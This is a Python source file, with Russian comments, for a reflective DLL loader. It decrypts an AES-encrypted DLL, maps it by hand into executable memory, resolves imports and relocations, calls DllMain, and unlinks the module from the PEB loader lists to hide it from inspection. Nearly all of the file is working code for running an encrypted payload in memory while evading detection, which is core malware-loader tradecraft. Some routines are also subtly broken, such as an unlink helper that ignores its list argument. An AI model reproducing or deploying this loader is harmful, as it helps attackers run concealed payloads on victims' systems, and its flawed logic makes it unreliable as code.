import ctypes
import logging
import pefile
from crypto.aes import AES128

class ReflectiveDLLLoader:
    def __init__(self, aes_key: bytes):
        self.logger = logging.getLogger("ReflectiveDLLLoader")
        logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")
        self.kernel32 = ctypes.windll.kernel32
        self.ntdll = ctypes.windll.ntdll
        self.aes = AES128(aes_key)

    def load_encrypted_dll(self, filepath: str) -> bytes:
        """Загружает DLL с диска и расшифровывает с помощью AES"""
        self.logger.info(f"🔐 Загрузка и дешифровка DLL: {filepath}")
        with open(filepath, "rb") as f:
            encrypted_data = f.read()
        decrypted_data = self.aes.decrypt(encrypted_data)
        self.logger.info(f"✅ DLL расшифрована, размер: {len(decrypted_data)} байт")
        return decrypted_data

    def manual_map(self, dll_data: bytes) -> ctypes.c_void_p:
        """Ручная загрузка DLL в память (с устойчивой записью и безопасным указателем)"""
        self.logger.info("🚀 Начинаем ручной маппинг DLL в память...")

        # Обязательно: задаем правильные типы для VirtualAlloc
        self.kernel32.VirtualAlloc.restype = ctypes.c_void_p
        self.kernel32.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]

        # Парсим PE
        pe = pefile.PE(data=dll_data)
        size_of_image = pe.OPTIONAL_HEADER.SizeOfImage
        size_of_headers = pe.OPTIONAL_HEADER.SizeOfHeaders
        alloc_size = size_of_image + 0x1000  # Страховка: + одна страница

        # Выделяем память
        image_base = self.kernel32.VirtualAlloc(
            None, alloc_size, 0x3000, 0x40  # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        )
        if not image_base:
            raise MemoryError("❌ VirtualAlloc вернул 0")

        # Явное unsigned-cast
        image_base = ctypes.cast(image_base, ctypes.c_void_p).value
        image_base_ptr = ctypes.c_void_p(image_base)
        self.logger.info(f"✅ Память выделена по адресу: {hex(image_base)}")

        # Настройка WriteProcessMemory
        wpm = self.kernel32.WriteProcessMemory
        wpm.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
        wpm.restype = ctypes.c_bool
        process = self.kernel32.GetCurrentProcess()

        # 1. Копируем заголовки
        written = ctypes.c_size_t()
        src_buf = (ctypes.c_char * size_of_headers).from_buffer_copy(dll_data[:size_of_headers])
        if not wpm(process, image_base_ptr, src_buf, size_of_headers, ctypes.byref(written)):
            raise RuntimeError("❌ Ошибка записи заголовков DLL")
        self.logger.info(f"📄 Заголовки записаны: {written.value} байт")

        # 2. Копируем секции
        for section in pe.sections:
            virt_addr = image_base + section.VirtualAddress
            raw_data = section.get_data()
            section_buf = (ctypes.c_char * len(raw_data)).from_buffer_copy(raw_data)
            if not wpm(process, ctypes.c_void_p(virt_addr), section_buf, len(raw_data), ctypes.byref(written)):
                raise RuntimeError(f"❌ Ошибка записи секции {section.Name}")
            name = section.Name.decode(errors='ignore').rstrip('\x00')
            self.logger.info(f"📦 Секция {name} → {hex(virt_addr)} ({written.value} байт)")

        self.fix_imports(dll_data, image_base, pe)
        self.fix_relocations(dll_data, pe, image_base)
        self.unlink_from_peb(image_base)

        return ctypes.c_void_p(image_base)

    def fix_imports(self, dll_data: bytes, image_base: int, pe: pefile.PE):
        """Резолвинг IAT (Import Address Table) вручную с поддержкой форвардов"""
        self.logger.info("🛠️ Исправляем таблицу импорта (IAT)...")

        for entry in pe.DIRECTORY_ENTRY_IMPORT:
            dll_name = entry.dll.decode()
            h_module = self.kernel32.LoadLibraryA(entry.dll)
            if not h_module:
                raise RuntimeError(f"❌ Не удалось загрузить библиотеку: {dll_name}")
            self.logger.info(f"📦 DLL-зависимость загружена: {dll_name}")

            for imp in entry.imports:
                func_name = None
                func_ptr = None

                if imp.name:
                    func_name = imp.name.decode()
                    self.logger.info(f"🔍 Попытка получить адрес функции: {func_name}")
                    func_ptr = self.kernel32.GetProcAddress(h_module, imp.name)

                    # Обработка форварда вручную
                    if not func_ptr:
                        try:
                            forward_buf = ctypes.create_string_buffer(256)
                            size = self.kernel32.GetModuleFileNameA(h_module, forward_buf, 255)
                            if size == 0:
                                raise RuntimeError(f"🔴 Не удалось получить путь к DLL для форварда: {dll_name}")
                            dll_path = forward_buf.value.decode("utf-8")

                            # Пробуем открыть PE напрямую
                            forward_pe = pefile.PE(dll_path)
                            if hasattr(forward_pe, "DIRECTORY_ENTRY_EXPORT"):
                                for fwd in forward_pe.DIRECTORY_ENTRY_EXPORT.symbols:
                                    if fwd.name and fwd.name.decode(errors='ignore') == func_name:
                                        addr = image_base + imp.address - pe.OPTIONAL_HEADER.ImageBase
                                        self.logger.info(f"🔁 Forward найден для {func_name}, запись IAT: {hex(addr)}")
                                        break
                        except Exception as e:
                            self.logger.warning(f"⚠️ Ошибка при обработке форварда: {e}")

                elif imp.ordinal:
                    func_name = f"Ordinal({imp.ordinal})"
                    func_ptr = self.kernel32.GetProcAddress(h_module, ctypes.c_char_p(imp.ordinal))

                if not func_ptr:
                    self.logger.warning(f"⚠️ GetProcAddress вернул NULL для {func_name} в {dll_name}")
                    raise RuntimeError(f"❌ Не удалось разрешить функцию: {func_name} в {dll_name}")

                # Записываем адрес функции в IAT
                iat_ptr = image_base + imp.address - pe.OPTIONAL_HEADER.ImageBase
                addr = (ctypes.c_char * ctypes.sizeof(ctypes.c_void_p)).from_buffer_copy(
                    (ctypes.c_void_p)(func_ptr)
                )
                written = ctypes.c_size_t()
                res = self.kernel32.WriteProcessMemory(
                    self.kernel32.GetCurrentProcess(),
                    ctypes.c_void_p(iat_ptr),
                    addr,
                    ctypes.sizeof(ctypes.c_void_p),
                    ctypes.byref(written),
                )
                if not res:
                    raise RuntimeError(f"❌ Ошибка записи адреса IAT для {func_name}")
                self.logger.info(f"🔧 IAT: {func_name} → {hex(func_ptr)} записан ({written.value} байт)")

    def fix_relocations(self, dll_data: bytes, pe: pefile.PE, image_base: int):
        """Обработка и фиксация .reloc, если DLL загружена не по ImageBase"""
        preferred_base = pe.OPTIONAL_HEADER.ImageBase
        delta = image_base - preferred_base
        if delta == 0:
            self.logger.info("✅ DLL загружена по базовому адресу, relocations не требуются.")
            return

        self.logger.info(f"🔁 Обнаружено смещение базы: delta = {hex(delta)}")

        for base_reloc in pe.DIRECTORY_ENTRY_BASERELOC:
            reloc_rva = base_reloc.struct.VirtualAddress
            for reloc in base_reloc.entries:
                if reloc.type == pefile.RELOCATION_TYPE['IMAGE_REL_BASED_HIGHLOW']:
                    reloc_addr = image_base + reloc_rva + reloc.rva - base_reloc.struct.VirtualAddress
                    orig_val = ctypes.c_uint32.from_address(reloc_addr).value
                    ctypes.c_uint32.from_address(reloc_addr).value = orig_val + delta
                elif reloc.type == pefile.RELOCATION_TYPE['IMAGE_REL_BASED_DIR64']:
                    reloc_addr = image_base + reloc_rva + reloc.rva - base_reloc.struct.VirtualAddress
                    orig_val = ctypes.c_uint64.from_address(reloc_addr).value
                    ctypes.c_uint64.from_address(reloc_addr).value = orig_val + delta

        self.logger.info("✅ Relocations успешно применены.")

    def call_entry_point(self, dll_base: ctypes.c_void_p):
        """Ручной вызов DllMain (DLL_PROCESS_ATTACH)"""
        self.logger.info(f"🚪 Вызов DllMain по адресу {hex(dll_base.value)}")

        # Считаем RVA до entrypoint
        pe = pefile.PE(data=ctypes.string_at(dll_base, 0x1000))  # читаем заголовки из памяти
        entry_point_rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint
        dllmain_addr = dll_base.value + entry_point_rva

        # Преобразуем в вызываемую функцию
        DllMainProto = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_uint32, ctypes.c_void_p)
        dllmain_func = DllMainProto(dllmain_addr)

        result = dllmain_func(dll_base, 1, None)  # 1 = DLL_PROCESS_ATTACH
        if not result:
            raise RuntimeError("❌ DllMain вернул FALSE")

        self.logger.info("✅ DllMain успешно вызван.")

    def unlink_from_peb(self, dll_base: int):
            """Удаляет DLL из PEB->Ldr списков (Unlink из PEB)"""
            self.logger.info("🧪 Удаляем DLL из PEB (Unlink from PEB)...")

            class LIST_ENTRY(ctypes.Structure):
                _fields_ = [("Flink", ctypes.c_void_p),
                            ("Blink", ctypes.c_void_p)]

            class UNICODE_STRING(ctypes.Structure):
                _fields_ = [("Length", ctypes.c_ushort),
                            ("MaximumLength", ctypes.c_ushort),
                            ("Buffer", ctypes.c_void_p)]

            class LDR_DATA_TABLE_ENTRY(ctypes.Structure):
                _fields_ = [
                    ("Reserved1", ctypes.c_byte * 2),
                    ("InLoadOrderLinks", LIST_ENTRY),
                    ("InMemoryOrderLinks", LIST_ENTRY),
                    ("InInitializationOrderLinks", LIST_ENTRY),
                    ("DllBase", ctypes.c_void_p),
                    ("EntryPoint", ctypes.c_void_p),
                    ("SizeOfImage", ctypes.c_uint32),
                    ("FullDllName", UNICODE_STRING),
                    ("BaseDllName", UNICODE_STRING)
                ]

            class PEB_LDR_DATA(ctypes.Structure):
                _fields_ = [("Reserved1", ctypes.c_byte * 8),
                            ("InLoadOrderModuleList", LIST_ENTRY),
                            ("InMemoryOrderModuleList", LIST_ENTRY),
                            ("InInitializationOrderModuleList", LIST_ENTRY)]

            class PEB(ctypes.Structure):
                _fields_ = [("Reserved1", ctypes.c_byte * 2),
                            ("BeingDebugged", ctypes.c_byte),
                            ("Reserved2", ctypes.c_byte),
                            ("Reserved3", ctypes.c_void_p * 2),
                            ("Ldr", ctypes.POINTER(PEB_LDR_DATA))]

            class PROCESS_BASIC_INFORMATION(ctypes.Structure):
                _fields_ = [("Reserved1", ctypes.c_void_p),
                            ("PebBaseAddress", ctypes.POINTER(PEB)),
                            ("Reserved2", ctypes.c_void_p * 2),
                            ("UniqueProcessId", ctypes.c_void_p),
                            ("Reserved3", ctypes.c_void_p)]

            pbi = PROCESS_BASIC_INFORMATION()
            size = ctypes.c_ulong()
            self.ntdll.NtQueryInformationProcess(
                self.kernel32.GetCurrentProcess(),
                0,
                ctypes.byref(pbi),
                ctypes.sizeof(pbi),
                ctypes.byref(size)
            )

            peb = pbi.PebBaseAddress.contents
            ldr = peb.Ldr.contents

            def unlink(entry: ctypes.POINTER(LDR_DATA_TABLE_ENTRY), list_head: ctypes.POINTER(LIST_ENTRY)):
                flink = entry.contents.InLoadOrderLinks.Flink
                blink = entry.contents.InLoadOrderLinks.Blink
                if flink and blink:
                    ctypes.cast(flink, ctypes.POINTER(LIST_ENTRY)).contents.Blink = blink
                    ctypes.cast(blink, ctypes.POINTER(LIST_ENTRY)).contents.Flink = flink

            entry_ptr = ctypes.cast(ldr.InLoadOrderModuleList.Flink, ctypes.POINTER(LDR_DATA_TABLE_ENTRY))
            while entry_ptr:
                if entry_ptr.contents.DllBase == dll_base:
                    unlink(entry_ptr, ctypes.byref(ldr.InLoadOrderModuleList))
                    unlink(entry_ptr, ctypes.byref(ldr.InMemoryOrderModuleList))
                    unlink(entry_ptr, ctypes.byref(ldr.InInitializationOrderModuleList))
                    self.logger.info("✅ DLL удалена из PEB списков!")
                    return
                entry_ptr = ctypes.cast(entry_ptr.contents.InLoadOrderLinks.Flink, ctypes.POINTER(LDR_DATA_TABLE_ENTRY))

